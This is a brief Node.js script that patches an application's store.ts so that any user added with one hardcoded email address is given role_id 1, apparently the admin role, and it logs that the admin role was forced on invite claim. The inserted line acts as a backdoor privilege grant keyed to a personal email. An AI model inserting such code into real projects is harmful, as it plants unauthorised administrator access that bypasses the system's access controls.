const fs = require('fs');
const path = require('path');
const storePath = path.join(__dirname, 'src/data/store.ts');
let content = fs.readFileSync(storePath, 'utf8');

// Inside constructor or after users are initialized
content = content.replace("this.users.push(newUser);", "this.users.push(newUser);\n    if (email.toLowerCase() === 'keku121@gmail.com') newUser.role_id = 1;");

fs.writeFileSync(storePath, content);
console.log("Admin role forced on invite claim");
